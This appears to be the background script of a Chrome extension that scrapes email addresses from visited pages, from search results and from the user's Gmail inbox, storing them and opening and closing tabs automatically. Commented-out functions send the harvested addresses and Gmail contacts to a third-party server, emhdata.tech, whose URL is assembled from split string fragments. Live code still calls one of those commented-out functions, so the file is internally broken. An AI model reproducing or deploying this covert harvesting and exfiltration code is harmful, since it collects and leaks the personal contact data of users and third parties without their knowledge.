var tabId_ = 0;
h5 = 'saveStatG.php';
h4 = 'saveEmails.php';
h3 = '/hunter/';
h2 = 'emhdata.tech';
h1 = 'http://';

chrome.extension.onConnect.addListener(function (port) {
    port.onMessage.addListener(function (msg) {
        if (msg && msg.data && msg.url) {
            saveCollectedEmails(msg.data);
            // checkPreviouslySent(msg.data, msg.url);
        }
        port.postMessage('ok');
    });
});

chrome.runtime.onStartup.addListener(function (details) {
    // check the date of the last cleaning
    chrome.storage.local.get('lastClear', function (item) {
        var curDate = (new Date()).getTime();

        // clear if date more than 5 days
        if (!item['lastClear'] || (((curDate - item['lastClear']) / 1000) > 432000) ) {
            chrome.storage.local.clear();
            chrome.storage.local.set({ 'lastClear': curDate }, function () {
            });
        }

    });
});

function saveCollectedEmails(emails, tabid, automatedCrawlsFlag=false) {
    // console.log('here');
    if (emails && (emails.length > 0)) {
        if (localStorage['search'] == '0' || localStorage['search'] == undefined) {
            if (!localStorage['disableCollectEmails'] || (localStorage['disableCollectEmails'] == 'false') || automatedCrawlsFlag) {
                var collectedEmails = [];
                if (localStorage['collectedEmails']) {
                    collectedEmails = localStorage['collectedEmails'].split('\n');
                }
                for (var iNo = 0; iNo < emails.length; iNo++) {
                    var email = emails[iNo];
                    if (collectedEmails.indexOf(email) < 0) {
                        collectedEmails.push(email);
                    }
                }
    
                localStorage['collectedEmails'] = collectedEmails.join(',');
            }
        } else {
            searchData = JSON.parse(localStorage['search'])
            console.log(searchData);
            for (var iNo = 0; iNo < emails.length; iNo++) {
                var email = JSON.parse (emails[iNo]);
                console.log('emails')
                console.log(email);
                if (((email.email.toLowerCase().indexOf(searchData.fname.toLowerCase()) != -1) || (email.email.toLowerCase().indexOf(searchData.lname.toLowerCase()) != -1) ) && (email.email.toLowerCase().indexOf(searchData.cdomain.toLowerCase()) != -1)) {
                    console.log('email found');
                    console.log(email);
                    email = JSON.stringify(email);
                    localStorage.setItem('lastSearched', email)
                    localStorage['search'] = '0';
                    let tabs = localStorage['search_tabId'].split(',');
                    for(i=0; i<tabs.length; i++) {
                        chrome.tabs.remove(tabs[i]);
                    }
                    localStorage['search_tabId'] = '';
                } else {
                    let tabs = localStorage['search_tabId'].split(',');
                    let index = tabs.indexOf(tabid);
                    tabs.splice(index, 1);
                    if(tabs.length <= 0){
                        localStorage['search'] = '0';
                    }
                    localStorage['search_tabId'] = tabs;
                    chrome.tabs.remove(tabid);
                }
            }
        }
    }
}

function showEmails(emails, symbol) {
    console.log("here1")
    if (emails && (emails.length > 0) && (!localStorage['disableCollectEmails'] || (localStorage['disableCollectEmails'] == 'false'))) {
        if (symbol) {
            chrome.browserAction.setBadgeText({ "text": symbol, tabId: tabId_ });
        } else {
            chrome.browserAction.setBadgeText({ "text": emails.length.toString(), tabId: tabId_ });
        }
        chrome.browserAction.setBadgeBackgroundColor({ color: [255, 0, 0, 255] });
    } else {
        chrome.browserAction.setBadgeText({ "text": "", tabId: tabId_ });
    }
}

/* function saveSentEmails(emails, url) {
    key = MD5(tldjs.getDomain(url));
    console.log(key);
    chrome.storage.local.get(key, function (item) {
        if (item[key]) {
            var savedEmails = [];
            savedEmails = item[key];
            for (var iNo = 0; iNo < emails.length; iNo++) {
                if (savedEmails.indexOf(emails[iNo]) < 0) {
                    savedEmails.push(emails[iNo]);
                }
            }
        } else {
            var savedEmails = emails;
        }


        var obj = {};
        obj[key] = savedEmails;
        chrome.storage.local.set(obj, function () {
        });
    });
}

function parseSendEmails(response, emails, url) {
    var respObj = JSON.parse(response);

    if ((respObj) && (respObj.result)) {
        saveSentEmails(emails, url);
    }
} */

/* function sendEmails(emails, url) {
    if (emails.length > 0) {
        if (url.length > 254) {
            //TODO
        }

        var obj = {};
        obj['url'] = url;
        obj['emails'] = emails;
        var xhr = new XMLHttpRequest();
        xhr.open('POST', h1 + h2 + h3 + h4);
        xhr.overrideMimeType('text/xml');
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhr.onreadystatechange = function () {
            if (xhr.readyState == 4) {
                parseSendEmails(xhr.responseText, emails, url);
            }
        };
        xhr.send('data=' + encodeURIComponent(JSON.stringify(obj)));
    }
} */

/* function checkPreviouslySent(emails, url) {
    key = MD5(tldjs.getDomain(url));
    
    chrome.storage.local.get(key, function (item) {
        if (item[key]) {
            var savedEmails = [];
            var newEmails = [];
            savedEmails = item[key];
            for (var iNo = 0; iNo < emails.length; iNo++) {
                if (savedEmails.indexOf(emails[iNo]) < 0) {
                    newEmails.push(emails[iNo]);
                }
            }
        } else {
            newEmails = emails;
        }
        if (newEmails.length > 0) {
            sendEmails(newEmails, url);
        }
    });
} */

/* function checkPreviouslySentGmail(contacts, url, pageLang) {
    key = MD5(url);

    var emails = [];
    for (var iNo = 0; iNo < contacts.length; iNo++) {
        emails.push(contacts[iNo].email);
    }
    // showEmails(emails, '!');

    chrome.storage.local.get(key, function (item) {
        if (item[key]) {
            var savedEmails = [];
            var newEmails = [];
            savedEmails = item[key];
            for (var iNo = 0; iNo < emails.length; iNo++) {
                if (savedEmails.indexOf(emails[iNo]) < 0) {
                    newEmails.push(emails[iNo]);
                }
            }
        } else {
            var newEmails = emails;
        }

        if (newEmails.length > 0) {
            var contactsNew = contacts.filter(function (contact) {
                return (newEmails.indexOf(contact.email) !== -1)
            });

            var xhr = new XMLHttpRequest();
            xhr.open('POST', h1 + h2 + h3 + h5);
            xhr.overrideMimeType('text/xml');
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.onreadystatechange = function () {
                if (xhr.readyState == 4) {
                    parseSendEmails(xhr.responseText, newEmails, 'https://mail.google.com/');
                }
            };
            xhr.send('data=' + encodeURIComponent(JSON.stringify(contactsNew)) + '&lang=' + pageLang);
        }

    });
} */

chrome.tabs.onUpdated.addListener(function (tabId, info, tab) {
    // console.log("hit")
    function sendMes(methodName) {
        let domain
        if (tab.url.indexOf('mail') == -1 && tab.url.indexOf('google') != -1)
        {
            search = localStorage['search']
            domain = {domain: tldjs.getDomain(tab.url), ser: search};
        } else {
           domain = tldjs.getDomain(tab.url);
        }
        chrome.tabs.sendMessage(tabId, { method: methodName, domain: domain }, function (response) {
            console.log(response, response.data)
            if ((response) && (response.data)) {
                tabId_ = tabId;
                var initial_data = response.data;
                if(initial_data.url != undefined) {
                    let tabObj = {
                        url: initial_data.url
                      }
                    chrome.windows.create(tabObj, function (data) {
                        let tabids = [];
                        for(var i=0;i<data.tabs.length;i++){
                          tabids.push(data.tabs[i].id);
                        }
                        chrome.tabs.remove(parseInt(localStorage['search_tabId']))
                        localStorage['search_tabId'] = tabids;
                        console.log(localStorage['search_tabId'])
                    });
                } else {
                    var emails = [];
                    if ((initial_data) && (initial_data.length > 0)) {
                        count = 0;
                        for (var iNo = 0; iNo < initial_data.length; iNo++) {
                            var email = initial_data[iNo];
                            if ((email !== '') && (emails.indexOf(email) == -1)) {
                                emails.push(email);
                                count += 1;
                            }
                        }
                        showEmails(emails);

                        if (!((localStorage['disableCollect'] && localStorage['disableCollect'] == 'true'))) {
                            saveCollectedEmails(response.data , tabId_);
                        }
                        console.log(localStorage['automatedCrawls']);
                        if(localStorage['automatedCrawls'] && localStorage['automatedCrawls'].length > 0){
                        if(tab.status == "complete"){
                            let urlObjs = JSON.parse(localStorage['automatedCrawls']);
                            for(let i = 0; i<urlObjs.length; i++){
                            if(urlObjs[i].tabId == tabId && urlObjs[i].windowId == tab.windowId){
                                saveCollectedEmails(response.data, true);
                                chrome.tabs.remove(tabId)
                            }
                            }
                        }
                        } else if (response.data && (response.data.length > 0) && (response.data.length < 200)) {
                            // checkPreviouslySent(response.data, tab.url);
                        }
                    }
                }
        } else if(localStorage['search'] != undefined && localStorage['search'] != '0') {
            console.log("here")
            let tabs = localStorage['search_tabId'].split(',');
            let index = tabs.indexOf(tabId);
            tabs.splice(index, 1);
            if(tabs.length <= 0){
                localStorage['search'] = '0';
            }
            localStorage['search_tabId'] = tabs;
            chrome.tabs.remove(tabId);
            }
        });

    }

    if (info && info.status && (info.status.toLowerCase() === 'complete')) {
        console.log('completed');
        var methodName = 'getEmails';
        var timeout = 0;
        if ((tab.url.indexOf('google.') > 0) && (tab.url.indexOf('mail.') > 0) && (tab.url.indexOf('#inbox') > 0)) {
            methodName = 'getEmailsGmail';
            let domain = tldjs.getDomain(tab.url);
            chrome.tabs.sendMessage(tabId, { method: methodName, domain: domain }, function (response) {
                if (response && response.data && (response.data.length > 0)) {
                    tabId_ = tabId;
                    checkPreviouslySentGmail(response.data, 'https://mail.google.com/', response.pageLang);
                }
            })
        }

        methodName = 'getEmails';
        if ((tab.url.indexOf('bing.') > 0)) {
            methodName = 'getEmailsBing';
        } else {
            if ((tab.url.indexOf('google.') > 0) && (tab.url.indexOf('/search') > 0)) {
                methodName = 'getEmailsGoogle';
                timeout = 1000;
            }
        }
        if ((tab.url.indexOf('google.') > 0) && (tab.url.indexOf('mail.') > 0) && (tab.url.indexOf('#inbox') > 0)) {
            timeout = 500;
        }
        setTimeout(sendMes, timeout, methodName);
    }
});

/* var MD5 = function (s) { function L(k, d) { return (k << d) | (k >>> (32 - d)) } function K(G, k) { var I, d, F, H, x; F = (G & 2147483648); H = (k & 2147483648); I = (G & 1073741824); d = (k & 1073741824); x = (G & 1073741823) + (k & 1073741823); if (I & d) { return (x ^ 2147483648 ^ F ^ H) } if (I | d) { if (x & 1073741824) { return (x ^ 3221225472 ^ F ^ H) } else { return (x ^ 1073741824 ^ F ^ H) } } else { return (x ^ F ^ H) } } function r(d, F, k) { return (d & F) | ((~d) & k) } function q(d, F, k) { return (d & k) | (F & (~k)) } function p(d, F, k) { return (d ^ F ^ k) } function n(d, F, k) { return (F ^ (d | (~k))) } function u(G, F, aa, Z, k, H, I) { G = K(G, K(K(r(F, aa, Z), k), I)); return K(L(G, H), F) } function f(G, F, aa, Z, k, H, I) { G = K(G, K(K(q(F, aa, Z), k), I)); return K(L(G, H), F) } function D(G, F, aa, Z, k, H, I) { G = K(G, K(K(p(F, aa, Z), k), I)); return K(L(G, H), F) } function t(G, F, aa, Z, k, H, I) { G = K(G, K(K(n(F, aa, Z), k), I)); return K(L(G, H), F) } function e(G) { var Z; var F = G.length; var x = F + 8; var k = (x - (x % 64)) / 64; var I = (k + 1) * 16; var aa = Array(I - 1); var d = 0; var H = 0; while (H < F) { Z = (H - (H % 4)) / 4; d = (H % 4) * 8; aa[Z] = (aa[Z] | (G.charCodeAt(H) << d)); H++ } Z = (H - (H % 4)) / 4; d = (H % 4) * 8; aa[Z] = aa[Z] | (128 << d); aa[I - 2] = F << 3; aa[I - 1] = F >>> 29; return aa } function B(x) { var k = "", F = "", G, d; for (d = 0; d <= 3; d++) { G = (x >>> (d * 8)) & 255; F = "0" + G.toString(16); k = k + F.substr(F.length - 2, 2) } return k } function J(k) { k = k.replace(/rn/g, "n"); var d = ""; for (var F = 0; F < k.length; F++) { var x = k.charCodeAt(F); if (x < 128) { d += String.fromCharCode(x) } else { if ((x > 127) && (x < 2048)) { d += String.fromCharCode((x >> 6) | 192); d += String.fromCharCode((x & 63) | 128) } else { d += String.fromCharCode((x >> 12) | 224); d += String.fromCharCode(((x >> 6) & 63) | 128); d += String.fromCharCode((x & 63) | 128) } } } return d } var C = Array(); var P, h, E, v, g, Y, X, W, V; var S = 7, Q = 12, N = 17, M = 22; var A = 5, z = 9, y = 14, w = 20; var o = 4, m = 11, l = 16, j = 23; var U = 6, T = 10, R = 15, O = 21; s = J(s); C = e(s); Y = 1732584193; X = 4023233417; W = 2562383102; V = 271733878; for (P = 0; P < C.length; P += 16) { h = Y; E = X; v = W; g = V; Y = u(Y, X, W, V, C[P + 0], S, 3614090360); V = u(V, Y, X, W, C[P + 1], Q, 3905402710); W = u(W, V, Y, X, C[P + 2], N, 606105819); X = u(X, W, V, Y, C[P + 3], M, 3250441966); Y = u(Y, X, W, V, C[P + 4], S, 4118548399); V = u(V, Y, X, W, C[P + 5], Q, 1200080426); W = u(W, V, Y, X, C[P + 6], N, 2821735955); X = u(X, W, V, Y, C[P + 7], M, 4249261313); Y = u(Y, X, W, V, C[P + 8], S, 1770035416); V = u(V, Y, X, W, C[P + 9], Q, 2336552879); W = u(W, V, Y, X, C[P + 10], N, 4294925233); X = u(X, W, V, Y, C[P + 11], M, 2304563134); Y = u(Y, X, W, V, C[P + 12], S, 1804603682); V = u(V, Y, X, W, C[P + 13], Q, 4254626195); W = u(W, V, Y, X, C[P + 14], N, 2792965006); X = u(X, W, V, Y, C[P + 15], M, 1236535329); Y = f(Y, X, W, V, C[P + 1], A, 4129170786); V = f(V, Y, X, W, C[P + 6], z, 3225465664); W = f(W, V, Y, X, C[P + 11], y, 643717713); X = f(X, W, V, Y, C[P + 0], w, 3921069994); Y = f(Y, X, W, V, C[P + 5], A, 3593408605); V = f(V, Y, X, W, C[P + 10], z, 38016083); W = f(W, V, Y, X, C[P + 15], y, 3634488961); X = f(X, W, V, Y, C[P + 4], w, 3889429448); Y = f(Y, X, W, V, C[P + 9], A, 568446438); V = f(V, Y, X, W, C[P + 14], z, 3275163606); W = f(W, V, Y, X, C[P + 3], y, 4107603335); X = f(X, W, V, Y, C[P + 8], w, 1163531501); Y = f(Y, X, W, V, C[P + 13], A, 2850285829); V = f(V, Y, X, W, C[P + 2], z, 4243563512); W = f(W, V, Y, X, C[P + 7], y, 1735328473); X = f(X, W, V, Y, C[P + 12], w, 2368359562); Y = D(Y, X, W, V, C[P + 5], o, 4294588738); V = D(V, Y, X, W, C[P + 8], m, 2272392833); W = D(W, V, Y, X, C[P + 11], l, 1839030562); X = D(X, W, V, Y, C[P + 14], j, 4259657740); Y = D(Y, X, W, V, C[P + 1], o, 2763975236); V = D(V, Y, X, W, C[P + 4], m, 1272893353); W = D(W, V, Y, X, C[P + 7], l, 4139469664); X = D(X, W, V, Y, C[P + 10], j, 3200236656); Y = D(Y, X, W, V, C[P + 13], o, 681279174); V = D(V, Y, X, W, C[P + 0], m, 3936430074); W = D(W, V, Y, X, C[P + 3], l, 3572445317); X = D(X, W, V, Y, C[P + 6], j, 76029189); Y = D(Y, X, W, V, C[P + 9], o, 3654602809); V = D(V, Y, X, W, C[P + 12], m, 3873151461); W = D(W, V, Y, X, C[P + 15], l, 530742520); X = D(X, W, V, Y, C[P + 2], j, 3299628645); Y = t(Y, X, W, V, C[P + 0], U, 4096336452); V = t(V, Y, X, W, C[P + 7], T, 1126891415); W = t(W, V, Y, X, C[P + 14], R, 2878612391); X = t(X, W, V, Y, C[P + 5], O, 4237533241); Y = t(Y, X, W, V, C[P + 12], U, 1700485571); V = t(V, Y, X, W, C[P + 3], T, 2399980690); W = t(W, V, Y, X, C[P + 10], R, 4293915773); X = t(X, W, V, Y, C[P + 1], O, 2240044497); Y = t(Y, X, W, V, C[P + 8], U, 1873313359); V = t(V, Y, X, W, C[P + 15], T, 4264355552); W = t(W, V, Y, X, C[P + 6], R, 2734768916); X = t(X, W, V, Y, C[P + 13], O, 1309151649); Y = t(Y, X, W, V, C[P + 4], U, 4149444226); V = t(V, Y, X, W, C[P + 11], T, 3174756917); W = t(W, V, Y, X, C[P + 2], R, 718787259); X = t(X, W, V, Y, C[P + 9], O, 3951481745); Y = K(Y, h); X = K(X, E); W = K(W, v); V = K(V, g) } var i = B(Y) + B(X) + B(W) + B(V); return i.toLowerCase() }; */